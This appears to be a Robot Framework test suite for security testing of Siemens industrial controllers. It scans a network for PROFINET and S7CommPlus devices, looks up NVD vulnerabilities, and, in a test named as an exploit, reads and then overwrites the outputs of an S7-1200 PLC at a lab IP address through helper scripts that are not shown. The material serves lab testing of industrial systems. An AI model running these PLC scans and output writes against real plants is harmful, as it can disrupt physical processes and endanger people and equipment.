***Settings***
Library         Process
Library         Collections
Library         String
Library         ./NVDsearch.py
Library         ./profinetscanner.py
Library         ./S7CommPlusScanner.py
Library         ./S7-1200manipulator.py

***Variables***
${TARGET}               Profinet
${ETH_INTERFACE}        enx0050b66b034c
${TARGET_S71200_IP}     192.168.250.129         
${NEW_OUTPUT}           11111

***Test Cases***
# Some of the used scripts need administrative priviledges to run

SiemensScanTestCase
    ${IPAddressList}=               Scan for PROFINET devices
    Scan for S7CommPlus devices     ${IPAddressList}
    #Search and display vulnerabilities
SimaticS7ExploitTestCase
    Read Simatic PLC parameters
    Write to Simatic PLC outputs

***Keywords***
Search and display vulnerabilities
    [Documentation]     Runs online search for vulnerabilities with given parameter.
    ...                 Opens website with two tabs, one for the search and one for statistics on that search.
    Search from NVD database    ${TARGET}


Scan for PROFINET devices
    [Documentation]     Runs PROFINET scanner as a python module. Note: Needs administrative priviledges to run.
    ...                 Logs the results with warning level to see the results in console and log.
    ...                 Returns the IP addresses of found devices for further operations.
    [Timeout]           3 seconds
    ${resultDict}=              Run PROFINET scanner    ${ETH_INTERFACE}
    Log PROFINET scan results   ${resultDict}           ${TRUE}
    ${IPAddressList}=           Save IPs to list        ${resultDict}
    [Return]                    ${IPAddressList}    

Scan for S7CommPlus devices
    [Documentation]     Sends S7CommPlus-protocol 'connection request'-packet to the IP addresses in given array. Siemens devices
    ...                 such as S7-1200 and S7-1500 respond with additional information.
    [Arguments]         ${IPAddressList}
    :FOR    ${TARGET_IP}    IN      @{IPAddressList}
            ${result} =                         Run S7CommPlus scanner         ${TARGET_IP}         ${TRUE}
            Log S7CommPlus scanner results      ${result}                      ${TRUE}
    END

Run Profinet scanner externally
    [Documentation]     Runs PROFINET scanner as an external program similarly as from commandprompt.
    ...                 Logs the output at WARN level to output stdout to both log and console.
    Start Process       python  ./profinetscanner.py       -i ${ETH_INTERFACE}
    ${result}           Wait For Process                    timeout=${WAITTIME}      on_timeout=terminate
    Should be equal as integers     ${result.rc}            0
    log                             ${result.stdout}        WARN    

Save IPs to list
    [Documentation]     Saves IP addresses of found S7-1200 or S7-1500 devices
    ...                 from given multi-level dict to an array and returns it.
    [Arguments]         ${IP_dict}
    @{IPAddressList}=   Create List
    FOR     ${Key}    IN      @{IP_dict}
            ${Inner_dict}=      Get From Dictionary     ${IP_dict}           ${Key}
            ${DeviceName}=      Get From Dictionary     ${Inner_dict}       type_of_station
            Run keyword if      '${DeviceName}' == 'S7-1200' or '${DeviceName}' == 'S7-1500'    Run Keywords
                    Append to list from dict  ${Inner_dict}  ip_address     ${IPAddressList}
    END 
    [Return]            ${IPAddressList}   

Append to list from dict
    [Documentation]     Adds value in given dictionary with given key to given array.
    ...                 Bypasses problem of "Run keywords"-keyword not allowing assignment of variables within
    [Arguments]         ${Dictionary}           ${Key}              ${List}
    ${Value}=           Get From Dictionary     ${Dictionary}       ${Key}
    Append To List      ${List}                 ${Value}

Read Simatic PLC parameters
    [Documentation]     Attempts to read Siemens Simatic S7-1200 outputs, inputs and merkers
    ...                 through S7Comm protocol.
    [Arguments]         ${SCOPE}=ALL
    [Timeout]           3 seconds
    Read S7-1200 parameters     ${TARGET_S71200_IP}       ${SCOPE}

Write to Simatic PLC outputs
    [Documentation]     Attempts to write to Siemens Simatic S7-1200 outputs.
    ...                 Accepts string of 1 or 0 values to be written. Afterwards values are read
    ...                 to see if writing was succesful.
    [Timeout]           3 seconds
    Write to S7-1200 outputs    ${TARGET_S71200_IP}       ${NEW_OUTPUT}
    ${INFO}=                    Format string       Wrote {output} to {ip} outputs      output=${NEW_OUTPUT}        ip=${TARGET_S71200_IP}
    log                         ${INFO}             WARN
    Read Simatic PLC parameters     OUTPUTS